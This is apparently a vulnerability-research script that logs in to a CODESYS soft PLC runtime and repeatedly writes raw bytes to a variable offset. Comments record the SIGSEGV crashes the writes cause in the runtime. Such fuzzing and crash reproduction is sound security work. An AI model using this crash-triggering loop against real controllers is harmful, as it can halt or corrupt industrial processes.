#! /usr/bin/env python2
import os
from time import sleep

from lib import pycodesys
from lib.pycodesys import CDS_WORD, CDS_SIZE, VMeta

'''
Control the Codesys IEC application
Start / Stop
Warm and Cold reset
'''

cds = pycodesys.CodesysNode(host='softplc', port=11740, verbose=True)
chan_id = cds.connect()

# Login to Device

cds.loginToDevice()

# List loaded applications
appname = cds.readAppList()
print(appname)

cds.loginToApp(appname)

cds.reset()


print(cds.readAppStatus())

varlist = [
    VMeta(name='input', type=CDS_WORD, offset=0x1002),
]
#new_values = "\xDA\xDE"
#new_values = os.urandom(CDS_SIZE[varlist[0].type])

'''
except_signalhandler[246]: SIGSEGV (address:0x7ffff6820000) in <MainTask>
except_signalhandler[253]: invalid permissions for mapped object

except_signalhandler[246]: SIGSEGV (address:0x3400010) in <CoreDumpCreator>
except_signalhandler[250]: address not mapped to object

'''
#new_values = "\x83\xc3"

#new_values = "\xc7\xee"



'''
Random
'''
#new_values = os.urandom(CDS_SIZE[varlist[0].type])

#new_values = "\xb6\xee"

'''
"\x41\xd6" is good
'''
new_values = "\xbb\xf8"

while True:
    sleep(1)
    cds.reset()
    # print('--- Iteration %d' % i)
    print('** GONNA WRITE: HEX: %s TO OFFSET: %s' % (new_values.encode('hex'), hex(varlist[0].offset)))
    cds.write_variables(varlist, values=[new_values], is_raw_bytestr=True)
    cds.runSingleCycle()
    cds.readAppStatus()



#cds.reset()

# sleep(0.2)
# print(cds.readAppStatus())



# Get application status
#appstatus = cds.status(appname)
#print(appstatus)


#cds.readAppStatus()
#cds.reset()

# Start application
#cds.start()

#cds.stop()
#cds.runSingleCycle()

#cds.stop()

#cds.reset()

# Cold-reset variables
#cds.reset_c()

# Get application status
#appstatus = cds.status(appname)
#print(appstatus)

#cds.ping_cmpfuzz()



#cds.disconnect()









